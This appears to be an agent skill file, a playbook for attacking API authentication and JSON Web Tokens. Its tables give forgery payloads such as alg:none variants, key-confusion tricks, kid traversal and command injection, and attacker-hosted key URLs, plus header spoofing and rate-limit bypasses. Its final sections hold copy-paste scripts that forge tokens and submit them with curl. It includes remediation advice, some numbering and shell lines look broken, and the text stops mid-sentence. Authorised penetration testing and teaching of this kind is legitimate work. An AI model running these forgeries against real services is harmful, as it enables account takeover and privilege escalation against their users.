---
name: api-auth-and-jwt-abuse
description: >-
  API authentication and JWT abuse playbook. Use when testing bearer tokens, API keys,
  claim trust, proxy-header identity spoofing, rate limits, and request batching.
---

# SKILL: API Auth and JWT Abuse — Token Trust, Header Identity, Rate Limits

> **AI LOAD INSTRUCTION**: Each request carries two identity signals — the credential presented
> (JWT, opaque bearer, API key) and the connection metadata the edge adds (`X-Forwarded-For` and
> friends). Both are attacker-controlled more often than not. Work the decoded token first, then
> the headers the server trusts, then the limits meant to stop you. A JWT bug with no reachable
> privileged endpoint is not a finding: **never report a claim as trusted until a request proves
> the server acted on it.**

## 0. RELATED ROUTING

- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) — crypto depth; stay here for trust
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) — when the bug is the flow
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) — object/function authz
- [api-recon-and-docs](../api-recon-and-docs/SKILL.md) — bundles that leak keys and routes
- [graphql-and-hidden-parameters](../graphql-and-hidden-parameters/SKILL.md) — alias/batch collapse
- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) — login, MFA
- [401-403-bypass-techniques](../401-403-bypass-techniques/SKILL.md) — 403 boundary checks
- [attack-rate-limit-bypass](../attack-rate-limit-bypass/SKILL.md) — automation of §8.1
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — write-up

---

## 1. DECODE FIRST — NEVER TEST A TOKEN YOU HAVE NOT READ

Three base64url segments in `header.payload.signature` order. Re-pad before decoding: a segment
whose length mod 4 is 2 or 3 needs `=` appended — why shell one-liners fail for some tokens.

```python
import base64, json
def dec(seg):
    seg += "=" * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg))
```

| Field | Decides / attack |
|---|---|
| `alg` | `none` family (§2); `HS*` → offline crack (§5); `RS*`/`ES*`/`PS*` → key confusion (§3, §4) |
| `kid` | server-side lookup: filesystem, SQL, or command sink (§4) |
| `jku` / `x5u` / `jwk` | attacker-controlled key URL or inline key material (§4) |
| `typ` / `cty` / `crit` | nested or JWE handling; parameters the validator ignores |
| `sub`, `user_id`, `uid`, `email` | identity swap |
| `role`, `roles`, `groups`, `is_admin`, `permissions`, `scope` | privilege escalation |
| `tenant`, `org`, `org_id`, `team`, `realm` | cross-tenant read |
| `aud`, `azp`, `client_id` | cross-client/API reuse (§7) |
| `exp`, `iat`, `nbf`, `auth_time` | expiry and replay windows |
| `sid`, `jti`, `amr`, `mfa`, `acr`, `email_verified` | whether MFA or verification really ran |

**Before any payload edit, record three facts:** the exact `alg`; whether `kid`/`jku`/`x5u` are
present; and whether the decoded claims match the account you are actually signed in as. A
mismatch means the token is not authoritative — find the other source of truth first.

---

## 2. THE `alg:none` FAMILY — PARSER PROBLEMS, NOT STRING MATCHES

The bug is never the literal `none` — it is a validator that checks the algorithm *after*
well-formedness, compares it case-sensitively against a blocklist, or never reaches that branch.

**Canonical form:** rebuild with an empty signature segment **including the trailing dot**.
`h.p.` is a three-segment token with an empty signature; `h.p` is two segments that most parsers
reject before validation runs. Send all four controls, or the result is uninterpretable:
`h.p.` (test), `h.p` (parser control), `h.p.SIG` (original), `h.p.X` (one-byte signature — does
it verify at all?), plus your own signature grafted onto a foreign payload (confusion control).

| Variant | Shape | Defeats |
|---|---|---|
| lowercase | `{"alg":"none"}` | libraries that never implemented `none` |
| capitalised | `{"alg":"None"}` `{"alg":"NONE"}` `{"alg":"nOnE"}` | case-sensitive `"none"` blocklists |
| padded / whitespace | `{"alg":" none"}` `{"alg":"none "}` `{"alg":"none\t"}` | exact-match blocklists, naive parsing |
| mixed-case `typ` | `{"alg":"none","typ":"jwt"}` | validators keyed on `typ` |
| duplicate key | `{"alg":"none","alg":"HS256"}` | first-vs-last occurrence parsing |
| omitted algorithm | `{"typ":"JWT"}` | default fallback to `none` |
| empty / null / array | `{"alg":""}` `{"alg":null}` `{"alg":["none"]}` | `None` coercion, index-0 access, truthiness |
| signed-then-stripped | `alg` left `HS256`, signature empty | verification gated on signature presence |

**Trailing-dot variants get skipped:** `h.p.` vs `h.p..` vs `h.p.==`, plus a signature segment of
literal whitespace or `%00` — three different lengths to the decoder.

**What makes it a finding:** decode your own low-privilege token, keep every claim; rebuild with
`alg:none` and the empty signature, changing nothing else; replay against an endpoint requiring
authentication; then against one requiring privilege. Same body at step three is authentication
bypass; a 200 at step four is escalation.

---

## 3. RS256 → HS256 ALGORITHM CONFUSION

The server verifies RS256 with a **public** key. If the library picks the verification routine
from the token's own `alg`, switching to `HS256` makes it HMAC-verify with the RSA public key
bytes as the secret — and you have that key. Fetch it as JWK → PEM from `/.well-known/jwks.json`
plus per-tenant `/api/…`, `/admin/…` and `/oauth/certs`, `/jwks`, `/certs`, `/pubkey`.

**The brittleness is the whole attack** — five encodings, five different HMACs, one accepted:

| Key form | Why it differs |
|---|---|
| JWK → PEM, `-----BEGIN PUBLIC KEY-----` | standard conversion; try first |
| PEM with CRLF line endings | some servers normalise, some do not |
| PEM with no trailing newline | very common mismatch |
| Base64 SPKI blob, no PEM armour | libraries that strip headers |
| Raw DER (`MIIBIjANBgkqh…`) | key read as a file rather than parsed |

```bash
python3 - <<'PY'
import json, base64, hmac, hashlib, re
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
key = open('pub.pem','rb').read()          # try each form from the table
hdr, pl = {'alg':'HS256','typ':'JWT'}, {'sub':'1','role':'admin'}
signing = b64(json.dumps(hdr,separators=(',',':')).encode())+'.'+b64(json.dumps(pl,separators=(',',':')).encode())
print(signing+'.'+b64(hmac.new(key, signing.encode(), hashlib.sha256).digest()))
PY
```

**Control:** the unmodified server-signed RS256 token must still be accepted, or you have the
wrong key. **Class variants:** `RS256`→`HS384`/`HS512`; `ES256`→`HS256` (smaller key, PEM usually
exact, so it succeeds more often than RSA); `PS256` accepted while the code verifies `RS256` or
the reverse; `alg:none` accepted only for one `kid` — a per-key allowlist miss.

---

## 4. `kid` AND REMOTE KEY REFERENCES

| Sink | Payload | Effect |
|---|---|---|
| path traversal | `{"kid":"../../../../../../dev/null"}` | empty key: HMAC with `""` |
| known file | `{"kid":"../../../../../../etc/passwd"}` | key material is a public file — sign offline |
| scheme | `{"kid":"file:///dev/null"}` `/proc/self/environ` | server reads a predictable source |
| SQL | `kid=k1' UNION SELECT 'attackerchosenkey' -- -` | returns a value you control: sign with it |
| SQL oracle | `kid=k1' AND 1=CAST((SELECT secret FROM keys LIMIT 1) AS int)-- -` | key extraction by error |
| command | `kid=k1;id`, ``kid=k1`id` ``, `kid=k1$(id)`, `kid=k1\|id` | usually blind: confirm with a collaborator |

A predictable file means you sign offline; count the directories the app prepends.

**JWKS confusion.** When the app fetches a JWK set, `kid` selects an entry inside it: a **collision**
(your tenant's entry shares the admin's `kid` — first match wins and that key is yours); **absence**
(if the code takes `keys[0]`, register your key first so it indexes at `[0]`); **type confusion**
(a numeric `kid` matching an index); **duplicates** inside one set, where the winner is per-library.

**`jku` / `x5u` / inline `jwk`** — the token names its own verification key:

```json
{"alg":"RS256","jku":"https://attacker.tld/jwks.json"}
{"alg":"RS256","x5u":"https://attacker.tld/cert.pem"}
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

Three controls decide success: **no allowlist** (host your own key); a **prefix/substring
allowlist** (bypass via userinfo `https://target.tld@attacker.tld/jwks.json`, path confusion
`https://attacker.tld/…/#target.tld`, or an open redirect on the trusted host); or **injection
into the fetched URL** (CRLF, or a redirect from `jku=https://target.tld/jwks.json?x=`). Inline
`jwk` is strictly easier — no hosting, no SSRF — so try it first.

---

## 5. WEAK HMAC SECRET — OFFLINE CRACKING

Only applies to `HS256`/`HS384`/`HS512`; confirm from the header before spending time.

```bash
hashcat -m 16500 -a 0 token.txt wordlist.txt     # 16500 = JWT
hashcat -m 16500 -a 0 token.txt wordlist.txt -r rules/best64.rule
```

Wordlist order matters more than size — work down and stop at the first hit:

| # | Candidates | Rationale |
|---|---|---|
| 1 | product/vendor name and their repos' documented default secrets | samples ship literals |
| 2 | `secret`, `secretkey`, `jwt`, `jwtsecret`, `changeme`, `password`, `test`, `dev` | eternal top set |
| 3 | project name ± `_secret`/`_key`, digits, year suffixes | `acme_jwt_2024` beats random 8 chars |
| 4 | `rockyou` + `best64`/`OneRuleToRuleThemAll` | broad and cheap |
| 5 | other leaks: DB passwords, CI variables, `.env`, commit history | secrets get reused |
| 6 | full breach corpora and masks for short keys | only if 1–5 fail |

A cracked secret is a **full-compromise demonstration**: re-sign with `role: admin` and show
acceptance. Try inline key material (`jwk`, `x5c`, a `key` claim) as the secret first.

---

## 6. CLAIM ABUSE — THE SIGNATURE VALIDATES, THE CLAIMS SHOULD NOT

Flip **one claim at a time**, or you will not know which was honoured.

```json
{"role":"admin"} {"roles":["admin"]} {"is_admin":true} {"permissions":["*"]}
{"scope":"admin.read admin.write"} {"tenant":"1"} {"org_id":1} {"sub":"1"}
{"email":"admin@victim.tld"} {"email_verified":true} {"mfa":true} {"amr":["pwd"]}
```

| Claim ignored | Test | Consequence |
|---|---|---|
| `exp` | replay a token captured days ago | sessions outlive revocation |
| `aud` | present a product-A token to product B's API | silent cross-API trust |
| `iss` | use a foreign IdP token, or re-sign with another `iss` | federation confusion |
| `role` vs DB role | edit it in the token, read your profile in the app | app trusts a stale source |
| `email_verified` | set true with an unverified address | pre-account-takeover |
| `nbf` / `auth_time` | reuse a pre-MFA token after completing MFA | MFA not enforced per request |
| `jti` | replay one token for a one-time action | no replay protection |

A hand-edited `exp` breaks the signature: use a genuinely old captured token or re-sign once you
hold the key. **Source confusion:** where `role`, `tenant`, or `user_id` exist in token and
database, change the one the app does **not** read as your negative control, then the other.

---

## 7. TOKEN REUSE ACROSS PRODUCTS, CLIENTS, AND PLATFORMS

One IdP, many consumers; the weakest consumer sets the security of all of them. Capture a token
from each client and cross-replay into a matrix — the accepted cells are the findings and the
filled matrix is the report artefact.

| Reuse axis | Test | Reveals |
|---|---|---|
| product → product | company.com token against api.other-product.com | shared key with no `aud` check |
| web → mobile | browser token against the mobile API and its `/v1`, `/v2` | mobile paths skip web checks |
| mobile → web | long-lived mobile token against the web app | lifetimes leaking into stricter surfaces |
| environment | staging token against production | cross-environment shared secrets |
| host variants | `api.` vs `api-internal.` vs legacy `api-v1.` | forgotten hosts, weaker validation |
| SPA storage | same token in `localStorage`, cookie, URL fragment | exactly one copy is leakable |

Mobile tokens are long-lived, web tokens short: if the web surface accepts a mobile token, the
web session lifetime just became the mobile one.

---

## 8. HEADERS, KEY LEAKAGE, RATE LIMITS, AND BATCHING

### 8.1 Proxy headers as identity

Anything the edge rewrites, the app may also read. Send each header alone **and** in conflicting
combinations — precedence differs per stack.

| Header | Payload | Unlocks |
|---|---|---|
| `X-Forwarded-For` | `127.0.0.1`, `::1`, `1.2.3.4, 127.0.0.1`, empty | allowlists, limits, internal branches |
| `X-Real-IP` | same set | stacks preferring it over XFF |
| `Forwarded:` | `for=127.0.0.1;proto=https;host=internal.tld` | apps reading RFC 7239, edge writing legacy |
| `X-Client-IP` / `True-Client-IP` / `CF-Connecting-IP` | `127.0.0.1` | per-proxy preference |
| `X-Forwarded-Host` / `-Proto` | `internal.tld`, `localhost`, `http` | vhost routing, cookies |
| `X-Original-URL` / `X-Rewrite-URL` | `/admin/users` while requesting `/` | path ACLs enforced at the edge only |
| `X-HTTP-Method-Override` | `PUT`/`DELETE` on a blocked `POST` | verb checks at one layer |

An app reading the **first** value of `X-Forwarded-For: 127.0.0.1, <you>` sees you as local; one
reading the **last** sees the truth — send both orders. Highest-yield are conflicting pairs (your
real IP with `X-Real-IP: 127.0.0.1`; `X-Original-URL: /admin` with a benign path). Establish your
real edge IP first: if the app's view moves when you edit a header, that header is identity.

**Static API keys** never expire, are bound to no user, and ship to browsers. Look in JS bundles
and source maps (`.js.map` → original source), SSR state (`window.__ENV__`, `__NEXT_DATA__`),
mobile bundles (APK/IPA strings, `google-services.json`), public repos, CI logs, error traces,
and `/config.json`, `/env.js`, `/api/config`. Prefix greps turn noise into a hit list: `AKIA`,
`AIza`, `sk_live_`, `ghp_`, `xoxb-`, any `eyJ…` JWT. For each key answer four questions: **scope**
(what it unlocks), **privilege** (can it read other tenants), **provenance** (public artefact or
wire-only), **rotation** (does it still work after reporting). A key rejected in `Authorization`
may be accepted as `X-API-Key`, `X-Api-Token`, `X-Auth-Token`, a cookie, or a query parameter.

### 8.2 Rate-limit bypass families

A limit is a *key* plus a *window*; every bypass is an argument about how the key is derived.

| Family | Variants | Why |
|---|---|---|
| header rotation | new `X-Forwarded-For`/`X-Real-IP`/`Forwarded` per request | key is a client-controlled IP |
| same header, new syntax | `127.0.0.1`, `127.1`, `0.0.0.0`, `::ffff:127.0.0.1`, `127.0.0.1, 127.0.0.2` | value parsing ≠ key computation |
| identity rotation | new `User-Agent`, fresh login, random cookie, `Accept-Language` | key is a header hash |
| path case | `/api/login` → `/API/LOGIN`, `/Api/Login` | different router entry, same handler |
| trailing slash / dot | `/api/login/`, `/api/login/.`, `/api/login/..;/` | proxy and app disagree on the path |
| encoding | `//api//login`, `/api/%6cogin`, `/api/log%69n`, `/api/login%2f` | normalisation after keying |
| null byte / control | `/api/login%00`, `%0a`, `%09` | key truncates, router parses fully |
| query noise | `?_=<random>`, duplicate params | the limit key includes the query |
| method / content type | `PUT`/`PATCH`/`HEAD`; same body as form-urlencoded or `text/plain` | limit bound to one verb or route |
| version / host drift | `/v1/` vs `/v2/`; `api.` vs `www.` | separate counters per route or vhost |

Confirm the limit exists first: fire 30 requests, record the first `429`, then apply **one**
family and report the count past the threshold ("5/min, 500 accepted via XFF rotation").
Priority targets: OTP/2FA verification, password reset, login, invitations and coupons — anything
that costs money. A bypass on a search endpoint is informational.

### 8.3 Batching against auth endpoints

One request, many logical operations: the limit counts once, the work happens N times.

| Transport | Shape | Note |
|---|---|---|
| JSON array | `[{...},{...}]` to a single-object endpoint | many frameworks iterate by default |
| GraphQL aliases | `mutation { a: login(...){token} b: login(...){token} }` | one operation, N resolutions |
| GraphQL array | `[{query:…},{query:…}]` | batched transport often still enabled |
| URL-encoded repetition | `password=a&password=b&password=c` | last wins usually — check every one |
| duplicate headers | two `Authorization` or `X-Api-Key` lines | which is validated vs used |
| HTTP/2 / chunked | N streams on one connection; many ops in one body | connection- and size-based counters |

Wrap 100 attempts into one request against an endpoint that `429`s after 5 and count how many
were evaluated — distinct error responses count as much as successes. Then close the loop: if
attempt #97 returns a valid token to the caller, the lockout is fully bypassed.

---

## 9. DECISION TABLE — OBSERVED PATTERN → FIRST TEST

| Observed pattern | First test | Step |
|---|---|---|
| `alg` decodes to `none`/`None`/empty | resend with empty signature **and trailing dot**, claims unchanged | §2 |
| Signature looks the wrong length for the algorithm | `alg:none` family, then RS→HS confusion | §2, §3 |
| `alg` is `RS256`/`ES256` and a JWKS is reachable | re-sign as HS256, public key as HMAC secret | §3 |
| Key encoding ambiguous (PEM vs DER vs b64) | try PEM, CRLF, no-newline, DER, base64 | §3 |
| `kid` present and non-UUID | `../../../../../../dev/null`, then `/etc/passwd`, SQL quote, `;id` | §4 |
| `kid` is numeric | index or ID? probe key ordering and duplicates | §4 |
| `jku`/`x5u`/`jwk` in the header | inline `jwk` first, then attacker-hosted `jku` | §4 |
| duplicate or foreign `kid` in the JWKS | register your key under the colliding `kid` | §4 |
| `alg` is `HS256`, product name known | hashcat `-m 16500`, product-derived words first | §5 |
| Token verifies, you hold low privilege | flip one privilege claim, read it back | §6 |
| Privilege edits appear ignored | find whether token or DB authorizes, then attack that | §6 |
| A week-old captured token still works | `exp` unenforced — check revocation and refresh | §6 |
| Same token works on a second host/product | `aud`/`iss` ignored — map the reuse matrix | §7 |
| Static key values in JS or a source map | test scope, privilege, cross-tenant reads | §8 |
| Requests treated as internal/local | `X-Forwarded-For: 127.0.0.1`, then conflicting pairs | §8 |
| `403` on a path, `200` on `/` | `X-Original-URL`/`X-Rewrite-URL` to the blocked path | §8 |
| A `429` appears after N requests | one family at a time from §8.1, re-measuring | §8.1 |
| `429` on login but bulk jobs succeed | look for arrays or aliases on that operation | §8.2 |
| OTP/reset limited per account | distribute across usernames, then batch | §8.1, §8.2 |

**Evidence:** raw token unredacted with payload decoded; the exact modified token; the rejected
control beside the accepted request; before/after claims; the response proving the privileged
outcome (a 200 on `/me` is not admin); a wrong-key token that fails; the injection point and
derived key for `kid`/`jku`; the wordlist, recovered secret and a token you signed; the threshold
and accepted count for limits; your true edge IP beside the spoofed view; blast radius across
endpoints, products and tenants. **False positives:** `alg:none` on a token nothing authorizes; a
claim the server ignores; a 200 carrying an error body; intended sharing between two clients; a
key that unlocks only public data; a `429` returning the normal body; a header that changes a
logged IP but no authorization decision. **Remediation:** pin the algorithm and reject `none`
unconditionally; never let a token name its own key source (`jku`/`x5u`/inline `jwk` off or
allowlisted, fixed local JWKS); treat `kid` as an opaque identifier into a preloaded map, failing
closed and never touching path, SQL, or shell; validate `exp`, `nbf`, `aud`, `iss`, `typ` every
request; keep asymmetric keys asymmetric with a library that refuses algorithm mismatch;
high-entropy secrets, short lifetimes, none shared across products or environments; derive client
IP at the edge and strip inbound `X-Forwarded-*`/`X-Real-IP`/`X-Original-URL`; key limits on the
server-derived subject and socket peer in a shared store, counting operations not transport; cap
batch size and alias count, authorizing each entry; ship no long-lived secrets to clients.

---

## 10. CONFIRMING THE FINDING — ABUSE, NOT AN EXPIRED TOKEN
A JWT finding is proven when a **forged or altered token is accepted by the server** and grants
access the original did not. Anything short of that - a token that fails to parse, a claim you
changed locally, a signature you recomputed but never submitted - is work in progress.

| Step | Question | What it proves |
|---|---|---|
| 1 | Was the altered token **submitted to the real endpoint** and accepted (a `200` with data, not a `401`)? | acceptance, not forgeability in isolation |
| 2 | Is the response **different from the unaltered token's** in a way that matters? | the change had an authorization effect, not just a parse effect |
| 3 | Does the token grant access to a **specific resource you named in advance**? | impact is stated, not inferred |
| 4 | For `alg` confusion: is the server using the **public key as an HMAC secret**, proven by acceptance? | the classic confusion, not merely a header you edited |
| 5 | For weak HMAC: did the crack **recover the exact secret**, and does re-signing produce an accepted token? | a hashcat run is a lead until the token is accepted |
| 6 | For claim abuse: does the server act on the **claim you changed** (`role`, `sub`, `tenant`, `aud`)? | shows which claim is trusted |
| 7 | Is the effect reproducible with a **fresh token you forge from scratch**, not a replayed one? | proves the primitive, not a cached session |

**The altered token must be accepted, not merely well-formed.** Recomputing a signature with a
guessed secret and observing it locally proves you can run HMAC, not that the server shares your
secret. Submit it.

**Name the claim and the boundary.** "Changing `role` to `admin` in a token signed with a secret
recovered from the mobile client returned `/admin/users` data that the original token returned `403`
for" is a finding. "The JWT uses HS256" is not.

**Distinguish signature failures from claim failures.** If the server accepts your `alg:none` token
but the response is empty, the signature layer may be bypassed while the claims are still
constraining you - that is a narrower finding than full impersonation, and you should report the
part you actually proved.

---

## 11. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **original token, decoded** (header and payload) with the signature preserved | the baseline; without it the delta is uninterpretable |
| The **altered token in full**, including the exact header change (`alg`, `kid`, `jku`) | `alg:none` vs `alg:HS256` are different findings with different fixes |
| The **HTTP request carrying the altered token** and the **response proving acceptance** | the definitive artefact; local verification is not evidence |
| The **control response** with the original token (a `403` or a restricted payload) | establishes the delta and rules out an endpoint that was already open |
| The **resource reached** - the specific object, page, or action, with the data returned | impact in concrete terms |
| For HMAC recovery: the **recovered secret**, the **wordlist and mode used**, and the **re-signed accepted token** | the crack alone is not proof; the accepted re-signed token is |
| The **key material source** if the public key or secret was obtained (JWKS endpoint, `.well-known`, mobile bundle, repository) | explains the attack path and what must be rotated |
| Confirmation of **which check failed** (signature verification, `aud`/`iss` validation, claim authorization) | directs the fix to the right layer |
| **Negative control** - the same request with a token whose claims you did **not** alter returns the restricted result | proves the claim change caused the access |

Report the **primitive and the boundary**: "the API verifies the signature but does not validate
`aud`; a token minted for the public `client_id=web` is accepted at `/api/internal/keys`, returning
key material the web client would never see", never "JWT is misconfigured".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| Token altered locally but never submitted, or submitted and rejected (`401`) | no acceptance; the control worked |
| `alg:none` token accepted but the response is empty and no data is returned | signature bypass without an authorization gain; report the narrower finding |
| `alg` header changed but the server **requires** the registered algorithm | the server enforced it |
| HMAC secret "cracked" but the re-signed token is rejected | the recovered value was wrong |
| Claim changed and the response is the **same** as the control | the claim is not trusted for this decision |
| Endpoint returns data for **any** well-formed token | missing authentication entirely - a different (and possibly larger) finding; say so |
| Token accepted after expiry because the clock skew is within a documented tolerance | designed tolerance, not a bug |
| `kid` traversal reading a file you already know the contents of, with no signature bypass | path traversal without impact on verification |
| `jku`/`x5u` accepted but pointing at a URL the attacker cannot serve (allowlisted, unreachable) | the allowlist is the control working |
| The token is a **mock** from a test environment or a public demo key | not the production trust anchor |

**Acceptance by the real endpoint is the bar.** A forged token that is rejected is a negative result,
and reporting it wastes a triage cycle.

---

## 12. REMEDIATION REFERENCE

1. **Verify the signature with an explicit algorithm allowlist** - never derive the algorithm from the token header. Map each key to its expected algorithm and reject anything else, which removes the entire `alg:none` and `RS256`->`HS256` family in one control.
2. **Never accept a symmetric algorithm for an asymmetric key** - the confusion exists because the public key can be read as an HMAC secret; enforce key type per algorithm and use separate keys for signing and encryption.
3. **Validate `iss`, `aud`, and `exp` on every token, at every endpoint** - a token minted for one client or tenant must not be accepted by another service. Treat a missing required claim as a failure, not as a wildcard.
4. **Keep HMAC secrets long, random, and out of clients** - enforce a 256-bit minimum from a CSPRNG, store in a secret manager, rotate on a schedule, and never ship a signing key in a mobile bundle, JS asset, or repository. A crackable secret is a full forgery primitive.
5. **Pin `kid` to a server-side key store** - accept only opaque identifiers that map to a known key, never a path or URL, so `kid` traversal and injection cannot reach the filesystem or an attacker host.
6. **Do not fetch keys from a token-supplied URL** - an allowlisted, pinned JWKS endpoint only; never `jku`/`x5u` from untrusted input, and validate the fetched key's origin and content type.
7. **Authorize from server-side state for privileged decisions** - read roles, tenants, and permissions from the datastore rather than trusting an elevated claim in the token; claims may inform, but the server should confirm.
8. **Keep access tokens short-lived with a validated refresh flow** - minutes, not days, with rotation and reuse detection on refresh tokens so a leaked token has a bounded window and a detected theft.
9. **Bind tokens to their context where the architecture allows** - `aud` scoping, sender-constrained tokens (DPoP/mTLS), and per-service audiences limit the blast radius of a token that leaks across products.
10. **Rate-limit and monitor by the server-derived subject** - count on the token's verified identity and socket peer, not on client-supplied headers; alert on signature failures, unknown `kid` values, and tokens presented to the wrong audience.
11. **Test the negative cases in CI** - maintain automated tests that assert rejection of `alg:none`, an altered signature, a foreign `aud`, an expired `exp`, and a stripped required claim, so a library upgrade cannot silently relax verification.

---

---

## 13. EXECUTION PRIMITIVES

Copy-paste-runnable building blocks. Every one produces a **submittable token** or a **decoded
comparison**, so the result is interpretable without re-deriving the encoding by hand.

### 14.1 Decode, inspect, and diff any token pair

```bash
tok() { cut -d. -f"$2" <<<"$1" | tr '_-' '/+' | base64 -d 2>/dev/null; }
T1="$ORIGINAL"; T2="$ALTERED"
diff <(tok "$T1" 1) <(tok "$T2" 1)    # header delta: which alg/kid/jku changed
diff <(tok "$T1" 2) <(tok "$T2" 2)    # payload delta: which claim changed
echo "sig len: $(cut -d. -f3 <<<"$T1" | wc -c) -> $(cut -d. -f3 <<<"$T2" | wc -c)"
```

A token pair that differs in both header and payload cannot localise the cause. Change **one**
of them per test, and submit each variant separately.

### 14.2 Sweep the `alg:none` family with the four controls

```bash
python3 - <<'PY'
import json, base64, subprocess
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
ORIG = open('token.txt').read().strip()
H, P, _ = ORIG.split('.')
hdr = json.loads(base64.urlsafe_b64decode(H + '=' * -len(H) % 4))
hdr['alg'] = 'none'
h, p = b64(json.dumps(hdr, separators=(',', ':')).encode()), P
forms = {
 'h.p.':        f'{h}.{p}.',          # canonical: empty sig + trailing dot
 'h.p':         f'{h}.{p}',           # parser control: two segments
 'h.p.SIG':     ORIG,                 # baseline: must be accepted
 'h.p.X':       f'{h}.{p}.X',         # does it verify at all?
 'h.p.ws':      f'{h}.{p}. ',         # whitespace signature
 'h.p..':       f'{h}.{p}..',         # extra dot
 'h.p.eq':      f'{h}.{p}.==',        # padding chars as signature
 'none-stripped': ORIG,               # alg already none, sig present
}
for name, tk in forms.items():
    open('/tmp/tk.txt', 'w').write(tk)
    r = subprocess.run(['curl','-s','-o','/dev/null','-w','%{http_code}',
        '-H',f'Authorization: Bearer {tk}', ENDPOINT], capture_output=True, text=True)
    print(f'{name:16} {r.stdout}')
PY
```

`h.p.SIG` returning anything other than the privileged result means the endpoint or the account is
wrong - fix that before reading the other rows.

### 14.3 Confirm RS256 to HS256 with every key encoding

```bash
curl -sS https://target.tld/.well-known/jwks.json  > jwks.json
curl -sS https://target.tld/oauth/certs            > certs.json
python3 -c "
import json,base64
k=json.load(open('jwks.json'))['keys'][0]
n=base64.urlsafe_b64decode(k['n']+'='*-len(k['n'])%4)
print('modulus bytes:',len(n)); print('kid:',k.get('kid'))"
# convert each candidate form to PEM, then re-run the signing snippet in section 3
openssl rsa -pubin -in pub.pem -RSAPublicKey_out -outform DER 2>/dev/null | wc -c   # raw DER len
sed -e 's/$/
/' pub.pem > pub_crlf.pem                                              # CRLF variant
printf '%s' "$(cat pub.pem)" > pub_nonl.pem                                          # no trailing NL
```

The **original RS256 token must remain accepted** in the same run. If it is rejected, you fetched
the wrong key or the wrong tenant's key, and the HMAC result is meaningless.

### 14.4 `kid` traversal and injection probes

```bash
for KID in '../../../../dev/null' '../../../../etc/passwd' '..%2f..%2f..%2fdev%2fnull'            'key1|echo x' 'jwks.json' '' 'AAAA' 'null' '[]' "' OR 1=1--"; do
  H=$(printf '{"alg":"HS256","kid":"%s","typ":"JWT"}' "$KID" | base64 -w0 | tr '+/' '-_' | tr -d '=')
  P=$(printf '{"sub":"1","role":"admin"}'               | base64 -w0 | tr '+/' '-_' | tr -d '=')
  SIG=$(printf '%s.%s' "$H" "$P" | openssl dgst -sha256 -hmac '' -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')
  CODE=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $H.$P.$SIG" "$ENDPOINT")
  echo "kid=[$KID] -> $CODE"
done
```

`../../../../dev/null` yields an **empty key**; if the server accepts a token HMAC-signed with the
empty string, the `kid` is reaching the filesystem and you have forgery. Sweep `..%2f`/`%252f`
encodings because the path may be normalised after decoding.

### 14.5 Weak-HMAC recovery, end to end

```bash
# 1. evidence: is the secret guessable at all?
hashcat -m 16500 token.txt rockyou.txt --quiet        # JWT (HS256/384/512)
# hashcat -m 16500 requires the token in a file, one per line
# 2. prove it: re-sign and submit - the accepted response is the finding
python3 - <<'PY'
import hmac, hashlib, base64, subprocess, json
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
SECRET = open('secret.txt','rb').read().strip()
H, P, _ = open('token.txt').read().strip().split('.')
H = base64.urlsafe_b64decode(H + '='*-len(H)%4)
H = json.loads(H); H['alg'] = 'HS256'
h = b64(json.dumps(H, separators=(',',':')).encode())
p = b64(json.dumps({'sub':'1','role':'admin','exp':9999999999}, separators=(',',':')).encode())
s = b64(hmac.new(SECRET, f'{h}.{p}'.encode(), hashlib.sha256).digest())
tok = f'{h}.{p}.{s}'
print(subprocess.run(['curl','-s','-o','/dev/null','-w','%{http_code}','-H',
    f'Authorization: Bearer {tok}', __import__('os').environ['ENDPOINT']],
    capture_output=True, text=True).stdout)
PY
```

### 14.6 Claim-abuse matrix, one claim per run

```bash
python3 - <<'PY'
import json, base64, hmac, hashlib, subprocess, os
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
SECRET = open('secret.txt','rb').read().strip()
ORIG = open('token.txt').read().strip()
H, P, _ = ORIG.split('.')
h = base64.urlsafe_b64decode(H + '='*-len(H)%4)
p = json.loads(base64.urlsafe_b64decode(P + '='*-len(P)%4))
MUT = {
 'role':      [('role','admin'), ('roles',['admin']), ('is_admin',True)],
 'subject':   [('sub','1'), ('sub','0'), ('user_id','1')],
 'audience':  [('aud','internal'), ('aud',['internal']), ('aud','*')],
 'issuer':    [('iss','https://internal.tld')],
 'tenant':    [('tid','1'), ('tenant','admin'), ('org_id','1')],
 'time':      [('exp',9999999999), ('nbf',0), ('iat',0)],
 'scope':     [('scope','admin read write'), ('scope','*')],
}
for name, pairs in MUT.items():
    for k, v in pairs:
        q = dict(p); q[k] = v
        hh = b64(json.dumps(h, separators=(',',':')).encode())
        pp = b64(json.dumps(q, separators=(',',':')).encode())
        ss = b64(hmac.new(SECRET, f'{hh}.{pp}'.encode(), hashlib.sha256).digest())
        r = subprocess.run(['curl','-s','-o','/dev/null','-w','%{http_code}','-H',
            f'Authorization: Bearer {hh}.{pp}.{ss}', os.environ['ENDPOINT']],
            capture_output=True, text=True)
        print(f'{name:9} {k}={v!r:22} {r.stdout}')
PY
```

Each row is a **separate submission with a single changed claim**. A row that returns the same
status as the untouched baseline is a negative result - record it and move on rather than
reinterpreting it.

### 14.7 Audience and cross-service replay

```bash
# a token minted for service A, presented to service B
for EP in "$SVC_A/api/me" "$SVC_B/api/me" "$SVC_B/admin/users" "$INTERNAL/api/keys"; do
  echo "== $EP"
  curl -s -o /dev/null -w 'orig=%{http_code}' -H "Authorization: Bearer $TOKEN_A" "$EP"; echo
done
# the negative control is a token minted for B against B; it must succeed
curl -s -o /dev/null -w 'neg_control=%{http_code}
' -H "Authorization: Bearer $TOKEN_B" "$SVC_B/api/me"
```

Acceptance at `$SVC_B` or `$INTERNAL` with `TOKEN_A` is the finding; acceptance at `$SVC_A` is the
